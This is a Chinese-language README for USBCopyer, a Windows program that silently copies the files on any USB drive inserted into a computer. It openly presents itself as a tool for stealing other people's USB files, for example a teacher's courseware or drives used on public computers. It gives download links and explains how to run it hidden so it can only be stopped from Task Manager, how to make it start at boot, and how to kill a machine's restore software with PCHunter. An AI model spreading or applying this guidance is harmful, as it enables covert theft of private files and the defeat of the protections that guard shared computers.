#USBCopyer: 插上U盘自动复制U盘文件
偷U盘文件的神器
![Screenshot](https://git.oschina.net/kenvix/USBCopyer/raw/master/usbcopyer.png)
##已编译版本下载
.Net Framework 3.5       
[点击从Git@OSC下载](https://git.oschina.net/kenvix/USBCopyer/raw/master/USBCopyer/bin/Release/USBCopyer.exe)         [点击从GitHub下载](https://github.com/kenvix/USBCopyer/blob/master/USBCopyer/bin/Release/USBCopyer.exe?raw=true)           
需要安装.Net Framework 3.5，[没有安装请点此](https://download.microsoft.com/download/7/0/3/703455ee-a747-4cc8-bd3e-98a615c3aedb/dotNetFx35setup.exe)
###适用场景
1.学校的老师上完课直接拔U盘走人，要课件还不给（LZ制作这个程序的背景）         
2.这是台公用电脑，你想要偷别人U盘的东西         
###如何使用
1.下载
2.双击 USBCopyer.exe
3.程序将在托盘区运行，右击图标可以进行调整
  点击 "隐藏图标" 将彻底隐藏程序，只能靠任务管理器停止
  点击 "设置" 可以设置程序
###命令行
USBCopyer.exe [/hide]           
   /hide     以隐藏模式启动，只能通过任务管理器结束进程
###常见问题
#####学校老师很精明，上课前都要自己重启一次电脑，怎么办
将本程序设为开机启动，以 **/hide** 参数启动          
创建一个快捷方式，然后加上参数，拖到 "开始菜单" 的 "启动" 文件夹即可
#####手机插在电脑上，能偷文件吗
MTP/PTP不行，如果是挂载到电脑上可以
#####U盘被拔了怎么办
诱惑他不要拔啊
#####电脑关机就还原了，老师上完课都会关电脑的
用 PCHunter 之类的东西干掉还原程序
##代码仓库
[Git@OSC](https://git.oschina.net/kenvix/USBCopyer) [GitHub](https://github.com/kenvix/USBCopyer)            
[我的博客文章](https://zhizhe8.net/?p=86)